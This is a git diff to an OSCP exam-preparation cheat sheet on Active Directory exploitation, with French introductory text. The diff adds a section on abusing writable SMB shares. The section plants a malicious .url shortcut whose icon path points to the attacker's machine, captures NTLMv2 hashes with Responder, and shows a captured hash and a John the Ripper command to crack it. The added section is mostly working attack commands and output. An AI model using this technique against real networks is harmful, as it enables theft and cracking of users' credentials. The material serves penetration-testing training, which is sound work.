@@ -1,6 +1,8 @@
 # 🏅 OSCP Cheat Sheet
 
 {% hint style="success" %}
+
+
 Ce document regroupe tout ce que j’ai appris au travers des box et des cours de préparation aux techniques d’exploitation Active Directory. Il reflète mon expérience personnelle et n’engage que moi. Je ne couvre pas ici les techniques les plus avancées, mais vous pouvez vous tourner vers d’autres ressources comme [The Hacker Recipes](https://www.thehacker.recipes/) pour approfondir le sujet.
 {% endhint %}
 
@@ -774,6 +776,48 @@ nxc smb 192.168.1.0/24 -u UserName -p 'PASSWORDHERE' --sam
 </strong>grep -oP '^[^:]+:\d+:[a-f0-9]{32}:[a-f0-9]{32}' secretsdump.txt | awk -F: '{print $4}' > secretsdumphashes.txt
 
 </code></pre>
+
+<details>
+
+<summary>READ,WRITE Permissions</summary>
+
+create a malicious url file:
+
+```bash
+[InternetShortcut]
+URL=Random_nonsense
+WorkingDirectory=Flibertygibbit
+IconFile=\\<kali url>\%USERNAME%.icon
+IconIndex=1
+```
+
+launch responder:
+
+```
+responder -I tun0 -wv
+```
+
+and on the smbclient instance:
+
+```
+smb: \> put shell.url 
+```
+
+After getting a git that should look like this:
+
+```sh
+[SMB] NTLMv2-SSP Client   : 192.168.212.172
+[SMB] NTLMv2-SSP Username : VAULT\anirudh
+[SMB] NTLMv2-SSP Hash     : anirudh::VAULT:1122334455667788:3E3707D87E6C52CBAD58B5B494F109A0:0101000000000000803B0EB9FE91DB0143226BF87B14A7A8000000000200080046005A005100310001001E00570049004E002D0057005600300050003300430044004D0032005A00560004003400570049004E002D0057005600300050003300430044004D0032005A0056002E0046005A00510031002E004C004F00430041004C000300140046005A00510031002E004C004F00430041004C000500140046005A00510031002E004C004F00430041004C0007000800803B0EB9FE91DB0106000400020000000800300030000000000000000100000000200000A26B564BC75A19D5CF9CFDC087083FCDDB4C8E97519F75A674E3DF5FA98AC4860A001000000000000000000000000000000000000900260063006900660073002F003100390032002E003100360038002E00340035002E003100350038000000000000000000
+```
+
+you can crack  it with this command:
+
+```sh
+john --wordlist=/usr/share/wordlists/rockyou.txt --rules=best64 hash
+```
+
+</details>
 
 ### 🔍 LDAP Enumeration
 
